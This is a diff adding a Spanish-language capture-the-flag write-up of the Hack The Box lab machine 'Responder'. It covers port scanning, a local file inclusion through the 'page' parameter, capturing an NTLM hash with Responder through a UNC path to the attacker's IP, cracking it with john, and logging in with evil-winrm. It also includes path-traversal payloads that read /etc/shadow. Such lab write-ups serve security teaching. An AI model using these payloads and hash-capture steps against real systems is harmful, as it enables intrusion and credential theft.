@@ -925,6 +925,235 @@ Probamos con las credenciales que obtuvimos previamente desde el servicio FTP:
 
 Hemos completado la máquina.
 
+<hr />
+<h2 id="responder"><h1 class="titulo-principal">Responder</h1></h2>
+
+<div id="imgs" style="text-align: center;">
+  <img src="/assets/images/StartingPoint/responder/responder.png" alt="under" oncontextmenu="return false;">
+</div>
+
+
+Encendemos la máquina y nos da la dirección IP 10.129.175.41, enviamos unos paquetes para saber si el Host está activo:
+
+```bash
+❯ ping -c 5 10.129.175.41
+PING 10.129.175.41 (10.129.175.41) 56(84) bytes of data.
+64 bytes from 10.129.175.41: icmp_seq=1 ttl=127 time=115 ms
+64 bytes from 10.129.175.41: icmp_seq=2 ttl=127 time=123 ms
+64 bytes from 10.129.175.41: icmp_seq=3 ttl=127 time=101 ms
+64 bytes from 10.129.175.41: icmp_seq=4 ttl=127 time=97.9 ms
+64 bytes from 10.129.175.41: icmp_seq=5 ttl=127 time=98.2 ms
+--- 10.129.175.41 ping statistics ---
+5 packets transmitted, 5 received, 0% packet loss, time 4005ms
+rtt min/avg/max/mdev = 97.862/107.099/123.071/10.278 ms
+```
+
+Con un TTL de 127 estamos enfrentando una máquina Windows.
+# Enumeración
+
+Lanzamos un escaneo rápido y sigiloso con nmap:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.175.41 -oG allPorts
+```
+
+![[HTB/Starting Point/Tier 2/Responder/Images/nmap.png]]
+
+Vemos 3 puertos abiertos, quitaremos el ruido de la captura de nmap con la herramienta previamente definida en la .zshrc **extractPorts**:
+
+![[HTB/Starting Point/Tier 2/Responder/Images/extractPorts.png]]
+
+Con la información parseada más importante de la captura vemos los puertos `80, 5985, 7680` pero, aun necesitamos un poco más de información. Por tanto, hacemos un escaneo con nmap usando una serie de scripts básicos de reconocimiento:
+
+```bash
+nmap -sCV -p80,5985,7680 10.129.175.41 -oN targeted
+```
+
+![[HTB/Starting Point/Tier 2/Responder/Images/nmap2.png]]
+
+Comenzado con el puerto 80, vamos a tratar de enumerar un poco más a detalle con la herramienta `whatweb`:
+
+![[HTB/Starting Point/Tier 2/Responder/Images/whatweb.png]]
+
+Encontramos que hay un dominio **unika.htb**, es decir, que al momento de ingresar por la dirección IP el navegador no entiende y no puede resolvernos la página de la máquina, por ahora seguimos enumerando el otro puerto HTTP:
+
+
+![[whatweb2.png]]
+
+Sin resultados, lo siguiente sera enumerar posibles rutas comunes por el puerto 80 usando nmap con un script programado en Lua. De esta manera haremos un poco de enumeración web:
+
+```bash
+namp --script http-enum 10.129.175.41 -oN webScan
+```
+
+![[HTB/Starting Point/Tier 2/Responder/Images/webScan.png]]
+
+Las rutas comunes fueron encontradas empleando un diccionario corto y no son muy prometedoras, se intenta como alternativa usar una herramienta más pesada como `gobuster` para enumerar posibles rutas comunes en el servicio web pero, haciendo uso de un diccionario más grande:
+
+```bash
+gobuster dir --url 10.129.175.41 --wordlist /opt/apps/Tools/SecList/Discovery/Web-Content/directory-list-2.3-medium.txt -o dirScan
+```
+
+![[HTB/Starting Point/Tier 2/Responder/Images/dirbust.png]]
+
+Pero no hay nada, así que probamos agregando una búsqueda por archivos con la extensión .PHP sin resultados.
+
+![[HTB/Starting Point/Tier 2/Responder/Images/dirbust2.png]]
+
+Si ingresamos el dominio `unika.htb` en el navegador nos encontramos conque Firefox no entiende y no puede resolver nuestra solicitud.
+
+![[HTB/Starting Point/Tier 2/Responder/Images/web.png]]
+
+Por tanto, para arreglaro se agrega al archivo `/etc/hosts` la dirección IP de la máquina y el dominio.
+
+```bash
+# Static table lookup for hostnames.
+# See hosts(5) for details.
+127.0.0.1	localhost
+::1		    localhost
+127.0.1.1	ferxoo.localdomain	ferxoo
+
+10.129.175.41	unika.htb
+```
+
+Al guardar el nuevo `/etc/hosts` y recargar la página en nuestro navegador, ahora si nos resuelve y encontramos una página web.
+
+![[HTB/Starting Point/Tier 2/Responder/Images/web2.png]]
+
+# Explotación
+
+Es una página sencilla y no cuenta con muchos apartados pero, uno de ellos llama la atención y es cuando cambiamos el idioma de la página a Frances. Podemos ver que la URL cambia y tenemos una variable `page` que quizás podamos explotar.
+
+![[web3.png]]
+
+Intentamos con un Path Trasversal:
+
+---
+# ¿Qué es Path Trasversal?
+
+Un directory traversal (o salto de directorio o cruce de directorio o path traversal) consiste en explotar una vulnerabilidad informática que ocurre cuando no existe suficiente seguridad en cuanto a la validación de un usuario, permitiéndole acceder a cualquier tipo de directorio superior (padre) sin ningún control.
+
+La finalidad de este ataque es ordenar a la aplicación a acceder a un archivo al que no debería poder acceder o no debería ser accesible. Este ataque se basa en la falta de seguridad en el código. El software está actuando exactamente como debe actuar y en este caso el atacante no está aprovechando un bug en el código.
+
+Directory traversal también es conocido como el ../ ataque punto punto barra, escalado de directorios y backtracking. 
+## Ejemplo
+
+Un ejemplo típico de una aplicación vulnerable es:
+
+```php
+<?php
+$template = 'blue.php';
+if ( isset( $_COOKIE['TEMPLATE'] ) )
+   $template = $_COOKIE['TEMPLATE'];
+include ( "/home/users/paloloco/templates/" . $template );
+?>
+```
+
+Un ataque contra este sistema podría ser mandar la siguiente petición de HTTP:
+
+```
+GET /vulnerable.php HTTP/1.0
+Cookie: TEMPLATE=../../../../../../../../../etc/shadow
+```
+
+Generando el servidor una respuesta como:
+```
+HTTP/1.0 200 OK
+Content-Type: text/html
+Server: Apache
+
+root:fi3sED95ibqR6:0:1:System Operator:/:/bin/bash 
+daemon:*:1:1::/tmp: 
+paloloco:f8fk3j1OIf31.:182:100:Developer:/home/users/paloloco/:/bin/bash
+```
+
+La repetición de los caracteres `../` después de '/home/users/paloloco/templates/' ha causado que el código `[include()](http://www.php.net/manual/en/function.include.php)` penetre hasta el [directorio raíz](https://es.wikipedia.org/wiki/Directorio_ra%C3%ADz "Directorio raíz") y entonces fuese al directorio de contraseñas de [UNIX](https://es.wikipedia.org/wiki/Unix "Unix") "/etc/shadow".
+
+El archivo de contraseñas de UNIX es un archivo que se utiliza comúnmente para realizar el **directory traversal**, y es utilizado frecuentemente para [crackear](https://es.wikipedia.org/wiki/Password_cracking "Password cracking") las contraseñas.
+
+---
+
+Intentamos hacer Path Trasversal con la variable `page`:
+
+![[web4.png]]
+
+No podemos hacer Path Trasversal pero, recordando que hay un puerto 7680:
+
+![[pando.png]]
+
+El puerto `7680` pando-pub usa el Protocolo de Control de Transmisión. TCP es uno de los protocolos principales en redes TCP/IP. TCP es un protocolo orientado en la conexión, necesita el apretón de manos para determinar comunicaciones de principio a fin. Solo cuando la conexión es determinada, los datos del usuario pueden ser mandados de modo bidireccional por la conexión.
+
+----
+# ¿Qué es Local File Inclusion LFI?
+
+LFI son vulnerabilidades web que son posibles gracias a errores por parte de los programadores. Al introducir un descuido de seguridad en las aplicaciones web, los programadores descuidados permiten que usuarios no autorizados accedan a archivos, aprovechen la funcionalidad de descarga, naveguen por la información disponible y mucho más.
+
+PHP emplean estas dos funciones para incluir el contenido de un archivo PHP en otro:
+
+1. La función include()
+2. La función require().
+
+Lo que separa a estas funciones es cómo responden a los problemas de carga de archivos. La primera función include señala una advertencia pero permite que el script continúe. La segunda, la función require, por otro lado, crea un error fatal, deteniendo así el script.
+
+Entonces, ¿cómo sería un ataque de inclusión de archivos PHP? Algo parecido a esto:
+
+```
+https://example.com/?page=filename.php
+```
+
+Este es un trozo de código que sería vulnerable a un ataque LFI. Verás, cuando la entrada no está desinfectada correctamente, los atacantes no tendrán problemas para modificar la entrada (el ejemplo de abajo) y manipular la aplicación para acceder a archivos restringidos, directorios e información general a través de la directiva “../”. Esto es lo que se conoce como Directory Path Traversal:
+
+```
+https://example.com/?page=../../../../etc/test.txt
+```
+
+En este caso, lo único que tuvo que hacer el ciberdelincuente fue sustituir “nombrearchivo.php” por “../../../etc/test.txt” en la URL de la ruta y, et voilà, pudo acceder al archivo de prueba. En esta fase, el intruso o intrusos podrían cargar un script malicioso en su servidor y acceder a ese script utilizando local file inclusion.
+
+----
+
+Gracias a este protocolo podemos probar con la herramienta `responder` a intentar un LFI:
+![[responder2.png]]
+
+> **NTLM** es una colección de protocolos creados por MS, permite autenticar usuarios con un dominio usando un desafío y si las respuestas coinciden el servidor permite el acceso.
+
+La funcion Hash entorno a formularios respecta, tienen su uso para almacenar contraseñas de forma más segura, de manera que no se puede convertir un Hash a su estado original. Un servidor guarda el Hash de la contraseña y cuando el usuario trata de iniciar sesión su texto digitado se 'Hashea' y se compara con el almacenado. Si esto es correcto entonces la contraseña es valida.
+
+Un NTHash es la salida del algoritmo que almacena estas contraseñas en sistemas Windows y Controladores de Dominio.
+
+Aquí entra `responder`, así podremos crear un SMB Malicioso tal que, cuando la página intente su NTLM, `responder` le envía un desafío, cuando el Servidor responde `responder` va a utilizar el desafío y la respuesta encriptada para generar un NetNTLMv2 y probamos varias contraseñas. Entonces si alguna genera el desafío **Esa sera la contraseña**. Este concepto se llama `Hash Cracking`.
+
+Ejecutamos `sudo python3 responder.py -I tun0`:
+
+![[responder3.png]]
+
+Y en la URL intentamos cargar un archivo cualquiera usando nuestra dirección IP de la VPN '//10.10.16.84/file'
+
+![[responder4.png]]
+
+Revisamos nuevamente `responder` y obtenemos el Hash. Luego, este Hash podemos guardarlo en un archivo '.txt' y podemos usar la herramienta `john the ripper` para 'Crackear' la contraseña.
+
+![[hash.png]]
+
+Para ello usamos `john` y el diccionario `rockyou.txt` y le pasamos el Hash.
+
+![[hash2.png]]
+
+Y obtenemos la contraseña del usuario 'Administrator:badminton'. Para entablar una conexión usamos la herramienta `evil-winrm`, posterior instalamos las gemas necesarias:
+
+![[winrm.png]]
+
+Y ahora podemos ejecutar:
+
+![[winrm2.png]]
+
+Entramos con `-i 10.129.175.41 -u administrator -p badminton`:
+
+![[intrusion.png]]
+
+Y con un poco de búsqueda encontramos la flag:
+
+![[HTB/Starting Point/Tier 2/Responder/Images/flag.png]]
+ y hemos completado la máquina.
 
 ---
 
